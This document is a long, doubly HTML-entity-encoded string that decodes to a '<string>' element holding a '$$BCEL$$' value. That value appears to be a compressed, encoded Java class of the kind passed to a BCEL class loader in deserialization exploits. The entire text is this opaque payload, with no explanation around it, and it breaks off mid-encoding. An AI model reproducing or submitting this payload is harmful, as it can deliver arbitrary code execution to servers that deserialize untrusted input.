&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#36;&amp;#36;&amp;#66;&amp;#67;&amp;#69;&amp;#76;&amp;#36;&amp;#36;&amp;#36;&amp;#108;&amp;#36;&amp;#56;&amp;#98;&amp;#36;&amp;#73;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#36;&amp;#56;&amp;#100;&amp;#84;&amp;#36;&amp;#53;&amp;#98;&amp;#83;&amp;#36;&amp;#104;&amp;#55;&amp;#36;&amp;#85;&amp;#36;&amp;#51;&amp;#101;&amp;#107;&amp;#108;&amp;#36;&amp;#100;&amp;#54;&amp;#36;&amp;#121;&amp;#78;&amp;#36;&amp;#57;&amp;#51;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#57;&amp;#48;&amp;#75;&amp;#36;&amp;#97;&amp;#102;&amp;#36;&amp;#57;&amp;#98;&amp;#77;&amp;#36;&amp;#57;&amp;#99;&amp;#106;&amp;#36;&amp;#99;&amp;#57;&amp;#70;&amp;#36;&amp;#56;&amp;#52;&amp;#75;&amp;#72;&amp;#36;&amp;#53;&amp;#100;&amp;#36;&amp;#68;&amp;#36;&amp;#78;&amp;#36;&amp;#97;&amp;#54;&amp;#100;&amp;#36;&amp;#115;&amp;#36;&amp;#84;&amp;#83;&amp;#50;&amp;#113;&amp;#36;&amp;#97;&amp;#48;&amp;#36;&amp;#57;&amp;#51;&amp;#36;&amp;#74;&amp;#121;&amp;#88;&amp;#36;&amp;#99;&amp;#98;&amp;#36;&amp;#99;&amp;#50;&amp;#36;&amp;#87;&amp;#36;&amp;#121;&amp;#36;&amp;#98;&amp;#98;&amp;#36;&amp;#104;&amp;#73;&amp;#36;&amp;#100;&amp;#98;&amp;#36;&amp;#101;&amp;#48;&amp;#97;&amp;#36;&amp;#102;&amp;#50;&amp;#36;&amp;#55;&amp;#98;&amp;#36;&amp;#102;&amp;#97;&amp;#36;&amp;#100;&amp;#99;&amp;#36;&amp;#88;&amp;#36;&amp;#100;&amp;#51;&amp;#105;&amp;#102;&amp;#36;&amp;#102;&amp;#97;&amp;#36;&amp;#68;&amp;#36;&amp;#102;&amp;#97;&amp;#36;&amp;#97;&amp;#51;&amp;#36;&amp;#100;&amp;#97;&amp;#36;&amp;#107;&amp;#36;&amp;#100;&amp;#57;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#115;&amp;#36;&amp;#118;&amp;#36;&amp;#80;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#56;&amp;#101;&amp;#36;&amp;#56;&amp;#102;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#100;&amp;#51;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#102;&amp;#51;&amp;#36;&amp;#97;&amp;#102;&amp;#36;&amp;#100;&amp;#102;&amp;#36;&amp;#102;&amp;#102;&amp;#36;&amp;#65;&amp;#36;&amp;#56;&amp;#48;&amp;#69;&amp;#36;&amp;#97;&amp;#56;&amp;#36;&amp;#51;&amp;#98;&amp;#80;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#53;&amp;#98;&amp;#69;&amp;#36;&amp;#97;&amp;#56;&amp;#56;&amp;#112;&amp;#36;&amp;#104;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#100;&amp;#56;&amp;#36;&amp;#101;&amp;#48;&amp;#36;&amp;#100;&amp;#98;&amp;#48;&amp;#36;&amp;#101;&amp;#51;&amp;#36;&amp;#99;&amp;#48;&amp;#56;&amp;#36;&amp;#100;&amp;#99;&amp;#50;&amp;#36;&amp;#101;&amp;#52;&amp;#78;&amp;#36;&amp;#82;&amp;#36;&amp;#67;&amp;#36;&amp;#98;&amp;#51;&amp;#36;&amp;#100;&amp;#101;&amp;#117;&amp;#36;&amp;#97;&amp;#48;&amp;#36;&amp;#65;&amp;#36;&amp;#100;&amp;#52;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#51;&amp;#99;&amp;#36;&amp;#99;&amp;#99;&amp;#36;&amp;#87;&amp;#36;&amp;#101;&amp;#49;&amp;#36;&amp;#57;&amp;#101;&amp;#89;&amp;#36;&amp;#101;&amp;#55;&amp;#36;&amp;#77;&amp;#36;&amp;#57;&amp;#57;&amp;#36;&amp;#98;&amp;#55;&amp;#97;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#56;&amp;#54;&amp;#69;&amp;#36;&amp;#104;&amp;#36;&amp;#101;&amp;#101;&amp;#36;&amp;#53;&amp;#98;&amp;#48;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#121;&amp;#98;&amp;#36;&amp;#97;&amp;#49;&amp;#87;&amp;#36;&amp;#122;&amp;#36;&amp;#89;&amp;#36;&amp;#112;&amp;#36;&amp;#102;&amp;#101;&amp;#36;&amp;#56;&amp;#101;&amp;#36;&amp;#70;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#97;&amp;#52;&amp;#36;&amp;#99;&amp;#100;&amp;#36;&amp;#122;&amp;#36;&amp;#98;&amp;#56;&amp;#36;&amp;#100;&amp;#56;&amp;#36;&amp;#81;&amp;#49;&amp;#36;&amp;#102;&amp;#102;&amp;#49;&amp;#36;&amp;#51;&amp;#98;&amp;#108;&amp;#113;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#51;&amp;#99;&amp;#108;&amp;#69;&amp;#36;&amp;#97;&amp;#56;&amp;#36;&amp;#118;&amp;#55;&amp;#36;&amp;#83;&amp;#36;&amp;#87;&amp;#70;&amp;#36;&amp;#51;&amp;#98;&amp;#36;&amp;#97;&amp;#49;&amp;#36;&amp;#85;&amp;#70;&amp;#36;&amp;#107;&amp;#36;&amp;#118;&amp;#36;&amp;#99;&amp;#55;&amp;#36;&amp;#57;&amp;#50;&amp;#76;&amp;#36;&amp;#53;&amp;#98;&amp;#112;&amp;#36;&amp;#97;&amp;#100;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#108;&amp;#36;&amp;#102;&amp;#101;&amp;#36;&amp;#105;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#56;&amp;#97;&amp;#100;&amp;#36;&amp;#98;&amp;#54;&amp;#36;&amp;#57;&amp;#101;&amp;#36;&amp;#101;&amp;#100;&amp;#36;&amp;#101;&amp;#100;&amp;#113;&amp;#36;&amp;#99;&amp;#57;&amp;#36;&amp;#100;&amp;#98;&amp;#36;&amp;#51;&amp;#102;&amp;#73;&amp;#36;&amp;#97;&amp;#49;&amp;#36;&amp;#98;&amp;#57;&amp;#36;&amp;#97;&amp;#99;&amp;#36;&amp;#110;&amp;#36;&amp;#57;&amp;#99;&amp;#36;&amp;#101;&amp;#101;&amp;#36;&amp;#75;&amp;#101;&amp;#36;&amp;#99;&amp;#49;&amp;#68;&amp;#36;&amp;#97;&amp;#51;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#100;&amp;#51;&amp;#80;&amp;#119;&amp;#81;&amp;#85;&amp;#36;&amp;#57;&amp;#48;&amp;#36;&amp;#53;&amp;#99;&amp;#36;&amp;#56;&amp;#57;&amp;#36;&amp;#100;&amp;#56;&amp;#36;&amp;#65;&amp;#36;&amp;#79;&amp;#36;&amp;#97;&amp;#50;&amp;#36;&amp;#97;&amp;#50;&amp;#48;&amp;#36;&amp;#101;&amp;#101;&amp;#36;&amp;#99;&amp;#99;&amp;#54;&amp;#36;&amp;#98;&amp;#53;&amp;#36;&amp;#85;&amp;#113;&amp;#36;&amp;#72;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#88;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#51;&amp;#97;&amp;#100;&amp;#36;&amp;#72;&amp;#36;&amp;#57;&amp;#98;&amp;#97;&amp;#36;&amp;#51;&amp;#97;&amp;#36;&amp;#100;&amp;#56;&amp;#36;&amp;#54;&amp;#48;&amp;#36;&amp;#57;&amp;#48;&amp;#36;&amp;#101;&amp;#51;&amp;#36;&amp;#83;&amp;#36;&amp;#115;&amp;#107;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#100;&amp;#51;&amp;#76;&amp;#50;&amp;#36;&amp;#99;&amp;#57;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#112;&amp;#97;&amp;#36;&amp;#98;&amp;#54;&amp;#36;&amp;#122;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#100;&amp;#48;&amp;#36;&amp;#97;&amp;#56;&amp;#65;&amp;#36;&amp;#117;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#85;&amp;#36;&amp;#53;&amp;#99;&amp;#36;&amp;#98;&amp;#54;&amp;#36;&amp;#97;&amp;#48;&amp;#36;&amp;#57;&amp;#56;&amp;#36;&amp;#118;&amp;#36;&amp;#36;&amp;#105;&amp;#36;&amp;#53;&amp;#98;&amp;#72;&amp;#36;&amp;#104;&amp;#36;&amp;#107;&amp;#36;&amp;#57;&amp;#52;&amp;#36;&amp;#101;&amp;#48;&amp;#36;&amp;#53;&amp;#98;&amp;#36;&amp;#97;&amp;#56;&amp;#90;&amp;#112;&amp;#36;&amp;#101;&amp;#53;&amp;#36;&amp;#102;&amp;#99;&amp;#36;&amp;#98;&amp;#52;&amp;#112;&amp;#36;&amp;#101;&amp;#98;&amp;#83;&amp;#36;&amp;#56;&amp;#51;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#51;&amp;#98;&amp;#85;&amp;#36;&amp;#53;&amp;#101;&amp;#36;&amp;#102;&amp;#100;&amp;#56;&amp;#36;&amp;#57;&amp;#100;&amp;#122;&amp;#36;&amp;#115;&amp;#36;&amp;#97;&amp;#50;&amp;#54;&amp;#36;&amp;#57;&amp;#55;&amp;#36;&amp;#114;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#79;&amp;#48;&amp;#51;&amp;#119;&amp;#36;&amp;#57;&amp;#55;&amp;#36;&amp;#100;&amp;#50;&amp;#36;&amp;#53;&amp;#100;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#57;&amp;#50;&amp;#36;&amp;#117;&amp;#36;&amp;#101;&amp;#57;&amp;#36;&amp;#102;&amp;#52;&amp;#118;&amp;#36;&amp;#57;&amp;#98;&amp;#36;&amp;#51;&amp;#100;&amp;#36;&amp;#97;&amp;#53;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#101;&amp;#49;&amp;#51;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#101;&amp;#57;&amp;#36;&amp;#101;&amp;#97;&amp;#36;&amp;#100;&amp;#55;&amp;#50;&amp;#36;&amp;#99;&amp;#57;&amp;#82;&amp;#36;&amp;#98;&amp;#97;&amp;#36;&amp;#97;&amp;#102;&amp;#36;&amp;#100;&amp;#50;&amp;#36;&amp;#83;&amp;#36;&amp;#121;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#56;&amp;#97;&amp;#73;&amp;#102;&amp;#36;&amp;#100;&amp;#53;&amp;#36;&amp;#57;&amp;#48;&amp;#36;&amp;#101;&amp;#102;&amp;#36;&amp;#97;&amp;#100;&amp;#36;&amp;#100;&amp;#99;&amp;#36;&amp;#102;&amp;#52;&amp;#114;&amp;#36;&amp;#101;&amp;#53;&amp;#97;&amp;#36;&amp;#103;&amp;#118;&amp;#36;&amp;#98;&amp;#56;&amp;#36;&amp;#120;&amp;#36;&amp;#79;&amp;#36;&amp;#100;&amp;#51;&amp;#68;&amp;#36;&amp;#101;&amp;#97;&amp;#36;&amp;#86;&amp;#36;&amp;#99;&amp;#102;&amp;#108;&amp;#36;&amp;#52;&amp;#48;&amp;#51;&amp;#36;&amp;#122;&amp;#36;&amp;#111;&amp;#36;&amp;#51;&amp;#97;&amp;#36;&amp;#84;&amp;#36;&amp;#89;&amp;#36;&amp;#102;&amp;#101;&amp;#36;&amp;#56;&amp;#56;&amp;#50;&amp;#36;&amp;#100;&amp;#57;&amp;#75;&amp;#117;&amp;#36;&amp;#102;&amp;#50;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#97;&amp;#56;&amp;#82;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#101;&amp;#56;&amp;#36;&amp;#56;&amp;#99;&amp;#87;&amp;#89;&amp;#36;&amp;#53;&amp;#100;&amp;#36;&amp;#97;&amp;#101;&amp;#36;&amp;#100;&amp;#99;&amp;#36;&amp;#54;&amp;#48;&amp;#81;&amp;#36;&amp;#97;&amp;#56;&amp;#36;&amp;#57;&amp;#52;&amp;#36;&amp;#98;&amp;#98;&amp;#36;&amp;#101;&amp;#100;&amp;#36;&amp;#102;&amp;#50;&amp;#36;&amp;#112;&amp;#36;&amp;#99;&amp;#100;&amp;#36;&amp;#101;&amp;#51;&amp;#36;&amp;#98;&amp;#54;&amp;#114;&amp;#36;&amp;#100;&amp;#55;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#100;&amp;#99;&amp;#72;&amp;#66;&amp;#76;&amp;#36;&amp;#101;&amp;#99;&amp;#120;&amp;#36;&amp;#57;&amp;#98;&amp;#36;&amp;#98;&amp;#99;&amp;#36;&amp;#116;&amp;#36;&amp;#98;&amp;#57;&amp;#36;&amp;#99;&amp;#99;&amp;#36;&amp;#51;&amp;#102;&amp;#86;&amp;#89;&amp;#36;&amp;#99;&amp;#97;&amp;#36;&amp;#114;&amp;#97;&amp;#36;&amp;#55;&amp;#101;&amp;#36;&amp;#101;&amp;#100;&amp;#109;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#98;&amp;#53;&amp;#36;&amp;#111;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#100;&amp;#101;&amp;#110;&amp;#36;&amp;#56;&amp;#55;&amp;#36;&amp;#98;&amp;#52;&amp;#122;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#98;&amp;#98;&amp;#36;&amp;#95;&amp;#95;&amp;#36;&amp;#98;&amp;#53;&amp;#36;&amp;#102;&amp;#99;&amp;#99;&amp;#36;&amp;#99;&amp;#57;&amp;#117;&amp;#36;&amp;#115;&amp;#99;&amp;#119;&amp;#36;&amp;#101;&amp;#48;&amp;#73;&amp;#36;&amp;#100;&amp;#98;&amp;#36;&amp;#55;&amp;#99;&amp;#36;&amp;#80;&amp;#36;&amp;#97;&amp;#102;&amp;#121;&amp;#36;&amp;#101;&amp;#48;&amp;#68;&amp;#90;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#98;&amp;#100;&amp;#36;&amp;#97;&amp;#48;&amp;#69;&amp;#36;&amp;#112;&amp;#36;&amp;#107;&amp;#119;&amp;#116;&amp;#36;&amp;#88;&amp;#36;&amp;#66;&amp;#36;&amp;#100;&amp;#101;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#100;&amp;#100;&amp;#36;&amp;#99;&amp;#53;&amp;#36;&amp;#57;&amp;#101;&amp;#75;&amp;#36;&amp;#113;&amp;#36;&amp;#55;&amp;#102;&amp;#36;&amp;#57;&amp;#100;&amp;#113;&amp;#36;&amp;#97;&amp;#53;&amp;#36;&amp;#118;&amp;#36;&amp;#57;&amp;#54;&amp;#36;&amp;#55;&amp;#99;&amp;#36;&amp;#57;&amp;#51;&amp;#36;&amp;#101;&amp;#98;&amp;#110;&amp;#36;&amp;#100;&amp;#50;&amp;#36;&amp;#115;&amp;#36;&amp;#51;&amp;#101;&amp;#69;&amp;#85;&amp;#36;&amp;#89;&amp;#36;&amp;#118;&amp;#36;&amp;#101;&amp;#50;&amp;#36;&amp;#51;&amp;#100;&amp;#36;&amp;#100;&amp;#100;&amp;#106;&amp;#36;&amp;#51;&amp;#101;&amp;#36;&amp;#102;&amp;#55;&amp;#36;&amp;#55;&amp;#99;&amp;#36;&amp;#102;&amp;#102;&amp;#120;&amp;#88;&amp;#36;&amp;#95;&amp;#36;&amp;#102;&amp;#55;&amp;#36;&amp;#54;&amp;#48;&amp;#36;&amp;#99;&amp;#53;&amp;#36;&amp;#53;&amp;#98;&amp;#36;&amp;#97;&amp;#56;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#95;&amp;#36;&amp;#121;&amp;#49;&amp;#36;&amp;#99;&amp;#54;&amp;#36;&amp;#108;&amp;#36;&amp;#102;&amp;#48;&amp;#36;&amp;#98;&amp;#57;&amp;#106;&amp;#36;&amp;#98;&amp;#53;&amp;#36;&amp;#98;&amp;#100;&amp;#36;&amp;#98;&amp;#56;&amp;#36;&amp;#101;&amp;#48;&amp;#36;&amp;#100;&amp;#53;&amp;#36;&amp;#85;&amp;#87;&amp;#74;&amp;#36;&amp;#113;&amp;#49;&amp;#77;&amp;#51;&amp;#36;&amp;#98;&amp;#100;&amp;#36;&amp;#84;&amp;#70;&amp;#36;&amp;#90;&amp;#36;&amp;#116;&amp;#36;&amp;#53;&amp;#101;&amp;#36;&amp;#101;&amp;#54;&amp;#36;&amp;#70;&amp;#36;&amp;#72;&amp;#36;&amp;#55;&amp;#101;&amp;#109;&amp;#36;&amp;#53;&amp;#100;&amp;#36;&amp;#97;&amp;#52;&amp;#36;&amp;#53;&amp;#100;&amp;#36;&amp;#57;&amp;#51;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#99;&amp;#97;&amp;#36;&amp;#57;&amp;#48;&amp;#49;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#56;&amp;#102;&amp;#99;&amp;#36;&amp;#97;&amp;#53;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#57;&amp;#56;&amp;#36;&amp;#97;&amp;#49;&amp;#36;&amp;#99;&amp;#98;&amp;#36;&amp;#100;&amp;#97;&amp;#70;&amp;#36;&amp;#100;&amp;#51;&amp;#36;&amp;#102;&amp;#51;&amp;#107;&amp;#36;&amp;#56;&amp;#99;&amp;#36;&amp;#57;&amp;#97;&amp;#36;&amp;#100;&amp;#54;&amp;#36;&amp;#113;&amp;#36;&amp;#102;&amp;#51;&amp;#65;&amp;#36;&amp;#99;&amp;#99;&amp;#36;&amp;#100;&amp;#102;&amp;#36;&amp;#98;&amp;#56;&amp;#77;&amp;#36;&amp;#99;&amp;#101;&amp;#48;&amp;#36;&amp;#102;&amp;#55;&amp;#36;&amp;#116;&amp;#36;&amp;#98;&amp;#99;&amp;#36;&amp;#100;&amp;#55;&amp;#36;&amp;#99;&amp;#52;&amp;#36;&amp;#101;&amp;#97;&amp;#36;&amp;#57;&amp;#48;&amp;#36;&amp;#68;&amp;#36;&amp;#101;&amp;#51;&amp;#95;&amp;#36;&amp;#99;&amp;#55;&amp;#83;&amp;#36;&amp;#118;&amp;#36;&amp;#101;&amp;#50;&amp;#36;&amp;#72;&amp;#67;&amp;#119;&amp;#36;&amp;#98;&amp;#102;&amp;#102;&amp;#36;&amp;#100;&amp;#99;&amp;#36;&amp;#98;&amp;#54;&amp;#36;&amp;#56;&amp;#57;&amp;#36;&amp;#101;&amp;#57;&amp;#56;&amp;#99;&amp;#36;&amp;#106;&amp;#36;&amp;#107;&amp;#36;&amp;#99;&amp;#98;&amp;#36;&amp;#51;&amp;#102;&amp;#99;&amp;#36;&amp;#56;&amp;#55;&amp;#101;&amp;#36;&amp;#111;&amp;#36;&amp;#51;&amp;#101;&amp;#106;&amp;#36;&amp;#73;&amp;#36;&amp;#97;&amp;#51;&amp;#36;&amp;#101;&amp;#100;&amp;#36;&amp;#101;&amp;#52;&amp;#36;&amp;#57;&amp;#49;&amp;#36;&amp;#56;&amp;#56;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#56;&amp;#56;&amp;#36;&amp;#57;&amp;#56;&amp;#36;&amp;#89;&amp;#36;&amp;#57;&amp;#53;&amp;#36;&amp;#99;&amp;#53;&amp;#36;&amp;#102;&amp;#52;&amp;#80;&amp;#36;&amp;#117;&amp;#70;&amp;#36;&amp;#101;&amp;#98;&amp;#107;&amp;#36;&amp;#99;&amp;#100;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#97;&amp;#53;&amp;#36;&amp;#99;&amp;#53;&amp;#36;&amp;#108;&amp;#36;&amp;#102;&amp;#48;&amp;#36;&amp;#57;&amp;#54;&amp;#36;&amp;#72;&amp;#36;&amp;#57;&amp;#101;&amp;#88;&amp;#36;&amp;#108;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#78;&amp;#36;&amp;#98;&amp;#98;&amp;#36;&amp;#101;&amp;#55;&amp;#36;&amp;#102;&amp;#100;&amp;#66;&amp;#36;&amp;#51;&amp;#99;&amp;#36;&amp;#101;&amp;#51;&amp;#67;&amp;#36;&amp;#117;&amp;#36;&amp;#119;&amp;#36;&amp;#57;&amp;#49;&amp;#49;&amp;#36;&amp;#95;&amp;#36;&amp;#70;&amp;#81;&amp;#36;&amp;#82;&amp;#36;&amp;#88;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#99;&amp;#101;&amp;#36;&amp;#56;&amp;#101;&amp;#112;&amp;#86;&amp;#36;&amp;#113;&amp;#36;&amp;#100;&amp;#51;&amp;#36;&amp;#66;&amp;#36;&amp;#101;&amp;#98;&amp;#73;&amp;#36;&amp;#97;&amp;#99;&amp;#36;&amp;#102;&amp;#49;&amp;#36;&amp;#67;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#97;&amp;#99;&amp;#36;&amp;#86;&amp;#108;&amp;#36;&amp;#56;&amp;#101;&amp;#36;&amp;#56;&amp;#55;&amp;#36;&amp;#97;&amp;#54;&amp;#67;&amp;#36;&amp;#100;&amp;#54;&amp;#76;&amp;#36;&amp;#99;&amp;#102;&amp;#78;&amp;#36;&amp;#57;&amp;#100;&amp;#36;&amp;#102;&amp;#54;&amp;#36;&amp;#101;&amp;#49;&amp;#36;&amp;#101;&amp;#51;&amp;#36;&amp;#97;&amp;#100;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#112;&amp;#36;&amp;#99;&amp;#54;&amp;#83;&amp;#36;&amp;#56;&amp;#100;&amp;#36;&amp;#56;&amp;#53;&amp;#36;&amp;#98;&amp;#50;&amp;#36;&amp;#99;&amp;#48;&amp;#36;&amp;#107;&amp;#117;&amp;#36;&amp;#98;&amp;#55;&amp;#36;&amp;#70;&amp;#36;&amp;#57;&amp;#55;&amp;#36;&amp;#102;&amp;#101;&amp;#109;&amp;#36;&amp;#99;&amp;#57;&amp;#36;&amp;#97;&amp;#100;&amp;#36;&amp;#100;&amp;#54;&amp;#36;&amp;#51;&amp;#101;&amp;#103;&amp;#36;&amp;#102;&amp;#97;&amp;#36;&amp;#68;&amp;#36;&amp;#100;&amp;#53;&amp;#36;&amp;#98;&amp;#48;&amp;#36;&amp;#101;&amp;#97;&amp;#36;&amp;#108;&amp;#36;&amp;#97;&amp;#97;&amp;#36;&amp;#71;&amp;#36;&amp;#55;&amp;#100;&amp;#105;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#97;&amp;#52;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#57;&amp;#48;&amp;#36;&amp;#74;&amp;#36;&amp;#100;&amp;#101;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#101;&amp;#101;&amp;#89;&amp;#112;&amp;#36;&amp;#57;&amp;#98;&amp;#36;&amp;#102;&amp;#99;&amp;#36;&amp;#102;&amp;#55;&amp;#36;&amp;#97;&amp;#57;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#101;&amp;#55;&amp;#36;&amp;#98;&amp;#100;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#102;&amp;#49;&amp;#48;&amp;#77;&amp;#36;&amp;#98;&amp;#49;&amp;#36;&amp;#99;&amp;#98;&amp;#36;&amp;#121;&amp;#36;&amp;#98;&amp;#56;&amp;#36;&amp;#102;&amp;#98;&amp;#36;&amp;#98;&amp;#102;&amp;#36;&amp;#111;&amp;#70;&amp;#36;&amp;#80;&amp;#36;&amp;#69;&amp;#36;&amp;#68;&amp;#36;&amp;#56;&amp;#98;&amp;#36;&amp;#51;&amp;#97;&amp;#57;&amp;#36;&amp;#99;&amp;#100;&amp;#36;&amp;#101;&amp;#54;&amp;#50;&amp;#57;&amp;#36;&amp;#88;&amp;#122;&amp;#36;&amp;#102;&amp;#97;&amp;#36;&amp;#51;&amp;#99;&amp;#68;&amp;#36;&amp;#57;&amp;#99;&amp;#55;&amp;#83;&amp;#36;&amp;#101;&amp;#52;&amp;#108;&amp;#120;&amp;#36;&amp;#56;&amp;#99;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#87;&amp;#36;&amp;#100;&amp;#101;&amp;#36;&amp;#89;&amp;#36;&amp;#107;&amp;#87;&amp;#36;&amp;#87;&amp;#36;&amp;#114;&amp;#36;&amp;#56;&amp;#97;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#78;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#85;&amp;#36;&amp;#101;&amp;#55;&amp;#36;&amp;#57;&amp;#100;&amp;#36;&amp;#102;&amp;#57;&amp;#89;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#101;&amp;#49;&amp;#115;&amp;#71;&amp;#36;&amp;#51;&amp;#97;&amp;#36;&amp;#56;&amp;#100;&amp;#82;&amp;#36;&amp;#108;&amp;#71;&amp;#36;&amp;#100;&amp;#99;&amp;#36;&amp;#89;&amp;#36;&amp;#97;&amp;#101;&amp;#36;&amp;#98;&amp;#53;&amp;#36;&amp;#57;&amp;#57;&amp;#36;&amp;#84;&amp;#36;&amp;#98;&amp;#48;&amp;#36;&amp;#99;&amp;#97;&amp;#36;&amp;#98;&amp;#57;&amp;#36;&amp;#100;&amp;#102;&amp;#36;&amp;#54;&amp;#48;&amp;#36;&amp;#97;&amp;#99;&amp;#36;&amp;#102;&amp;#49;&amp;#36;&amp;#79;&amp;#36;&amp;#102;&amp;#50;&amp;#36;&amp;#95;&amp;#36;&amp;#100;&amp;#101;&amp;#65;&amp;#36;&amp;#66;&amp;#36;&amp;#102;&amp;#102;&amp;#36;&amp;#101;&amp;#51;&amp;#36;&amp;#95;&amp;#78;&amp;#36;&amp;#99;&amp;#48;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#100;&amp;#51;&amp;#36;&amp;#56;&amp;#55;&amp;#98;&amp;#121;&amp;#36;&amp;#67;&amp;#73;&amp;#36;&amp;#108;&amp;#36;&amp;#57;&amp;#99;&amp;#36;&amp;#84;&amp;#36;&amp;#57;&amp;#56;&amp;#36;&amp;#51;&amp;#99;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#100;&amp;#50;&amp;#102;&amp;#80;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#100;&amp;#48;&amp;#36;&amp;#56;&amp;#55;&amp;#79;&amp;#36;&amp;#56;&amp;#50;&amp;#36;&amp;#51;&amp;#101;&amp;#36;&amp;#53;&amp;#99;&amp;#36;&amp;#102;&amp;#99;&amp;#36;&amp;#70;&amp;#36;&amp;#102;&amp;#50;&amp;#36;&amp;#57;&amp;#98;&amp;#36;&amp;#98;&amp;#102;&amp;#36;&amp;#111;&amp;#36;&amp;#57;&amp;#52;&amp;#36;&amp;#68;&amp;#75;&amp;#80;&amp;#36;&amp;#56;&amp;#53;&amp;#75;&amp;#36;&amp;#73;&amp;#117;&amp;#36;&amp;#70;&amp;#36;&amp;#99;&amp;#49;&amp;#36;&amp;#51;&amp;#99;&amp;#36;&amp;#117;&amp;#36;&amp;#111;&amp;#36;&amp;#99;&amp;#100;&amp;#36;&amp;#101;&amp;#51;&amp;#87;&amp;#36;&amp;#52;&amp;#48;&amp;#36;&amp;#56;&amp;#98;&amp;#36;&amp;#78;&amp;#36;&amp;#66;&amp;#36;&amp;#99;&amp;#97;&amp;#36;&amp;#102;&amp;#51;&amp;#48;&amp;#36;&amp;#56;&amp;#49;&amp;#36;&amp;#51;&amp;#101;&amp;#36;&amp;#57;&amp;#51;&amp;#36;&amp;#101;&amp;#56;&amp;#36;&amp;#101;&amp;#53;&amp;#36;&amp;#101;&amp;#48;&amp;#52;&amp;#36;&amp;#117;&amp;#36;&amp;#99;&amp;#49;&amp;#85;&amp;#36;&amp;#102;&amp;#52;&amp;#112;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#51;&amp;#102;&amp;#36;&amp;#52;&amp;#48;&amp;#36;&amp;#102;&amp;#57;&amp;#36;&amp;#103;&amp;#36;&amp;#53;&amp;#99;&amp;#36;&amp;#56;&amp;#55;&amp;#36;&amp;#57;&amp;#99;&amp;#73;&amp;#36;&amp;#67;&amp;#36;&amp;#51;&amp;#101;&amp;#36;&amp;#56;&amp;#51;&amp;#36;&amp;#99;&amp;#102;&amp;#113;&amp;#117;&amp;#36;&amp;#54;&amp;#48;&amp;#36;&amp;#79;&amp;#36;&amp;#98;&amp;#101;&amp;#36;&amp;#56;&amp;#48;&amp;#36;&amp;#95;&amp;#36;&amp;#82;&amp;#36;&amp;#102;&amp;#55;&amp;#36;&amp;#120;&amp;#36;&amp;#57;&amp;#5